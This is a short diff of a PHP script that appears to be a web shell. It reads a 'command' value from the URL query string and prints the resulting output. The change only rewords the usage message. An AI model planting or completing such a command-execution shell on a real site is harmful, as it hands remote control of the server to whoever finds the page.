@@ -8,7 +8,7 @@ if (isset($_GET['command'])) {
     echo "<p style='color:white;'>$output</p>";
 }
 else {
-  echo "<p style='color:white;'>GET parameters blank or not valid";
+  echo "<p style='color:white;'>GET parameters blank or not valid, pls use command parameter";
 }
 
 ?>
